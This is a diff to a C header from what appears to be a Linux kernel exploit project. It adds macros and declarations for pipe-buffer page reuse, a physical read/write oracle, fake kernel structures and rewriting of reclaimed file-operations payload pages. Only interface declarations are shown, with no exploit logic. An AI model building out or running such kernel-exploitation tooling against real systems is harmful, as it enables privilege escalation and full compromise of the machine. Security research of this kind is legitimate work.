@@ -194,6 +194,9 @@
 
 #define PAGE_PAYLOAD_FOPS 0
 #define PAGE_PAYLOAD_SLIDE 1
+#ifndef P0_ORACLE_PROBE_SLOT_COUNT
+#define P0_ORACLE_PROBE_SLOT_COUNT 1
+#endif
 
 struct kernelsnitch_shared_state;
 
@@ -225,6 +228,7 @@ struct user_pipe_buffer {
 };
 
 extern pid_t pipe_prepare_child;
+extern int pipe_prepare_hard_failed;
 extern uintptr_t page_base;
 extern uintptr_t fake_lock;
 extern uintptr_t fake_w0;
@@ -284,6 +288,7 @@ extern uint32_t pipe_page_type[PIPE_CANDIDATE_PAGES];
 extern uintptr_t pipebuf_page_base;
 extern uintptr_t pipebuf_addr;
 extern int pipebuf_pipe_idx;
+extern int p0_pipe_scan_changed_pages;
 extern char physrw_readback[64];
 extern char physrw_after_write[64];
 extern int physrw_read_ok;
@@ -329,6 +334,7 @@ extern uintptr_t fops_data_probe_addr;
 extern int fops_data_probe_active;
 extern int data_alias_uses_slide;
 extern int data_addr_canonical;
+extern int app_fops_reused_page_ready;
 extern int slide_p0_session_fresh;
 extern int memfd_leak;
 
@@ -376,6 +382,12 @@ void prepare_ctxs(void);
 int prepare_skb_payload(uintptr_t base, int payload_mode);
 uintptr_t prepare_kernel_page(int payload_mode);
 uintptr_t prepare_good_kernel_page(int payload_mode);
+int app_fops_page_reuse_enabled(void);
+#if defined(APP_FOPS_REWRITE_RECLAIMED_PAGE) && \
+    APP_FOPS_REWRITE_RECLAIMED_PAGE
+int prepare_reused_fops_payload(uintptr_t runtime_slide);
+int rewrite_reused_fops_payload(void);
+#endif
 
 #if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE || \
     !defined(SLIDE_STACK_WRITER)
@@ -441,6 +453,7 @@ void alloc_pipe_object(int pipefd[2]);
 void free_pipe_object(int pipefd[2]);
 uintptr_t prepare_pipe_buffer_page_child(void);
 uintptr_t prepare_pipe_buffer_page(void);
+int stop_pipe_prepare_child(void);
 void reset_pipe_attempt(void);
 uintptr_t direct_to_page(uintptr_t addr);
 uintptr_t direct_to_head_page(int fd, uintptr_t addr);
@@ -468,6 +481,7 @@ int install_pipe_physrw(int fd);
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
 int prepare_p0_pipe_oracle(void);
 int expand_p0_pipe_oracle(void);
+int rewrite_p0_payload_page(const void *data, size_t size);
 int verify_p0_pipe_oracle_gate(void);
 int verify_p0_pipe_data_page(uintptr_t target, uint64_t expected);
 uintptr_t scan_p0_pipe_oracle(void);
